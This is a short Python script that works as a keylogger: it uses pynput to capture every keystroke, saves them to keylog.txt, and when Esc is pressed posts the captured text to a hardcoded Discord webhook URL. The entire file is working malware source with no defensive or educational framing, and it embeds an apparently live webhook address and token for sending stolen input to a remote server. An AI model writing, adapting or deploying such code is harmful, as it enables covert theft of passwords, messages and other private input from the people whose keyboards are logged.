from pynput import keyboard
import time
import threading
import requests
webhook_url = "https://discord.com/api/webhooks/1308074170847985665/iwY3DxzII1jinRZ2Xla0w0Ix5GxB_yNjYPTG6nghZBeXvKXSXAWL5zTDWudH290mEP4N"

keystrokes = []

def on_press(key):
    try:
        keystrokes.append(key.char) 
    except AttributeError:
        keystrokes.append(f"[{key}]")  

def on_release(key):
    with open("keylog.txt", "w") as file:
        file.write("".join(keystrokes))

    if key == keyboard.Key.esc:
        exit()

def keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":

    keylogger()
    file_path = "keylog.txt"

    content = "".join(keystrokes)
    data = {
        "content": content
    }

    response = requests.post(webhook_url, data=data)
    if response.status_code == 204:
        print("Message and image sent successfully!")
    else:
        print(f"Failed to send message. Status code: {response.status_code}")
    print(f"Log file ready to send: {file_path}")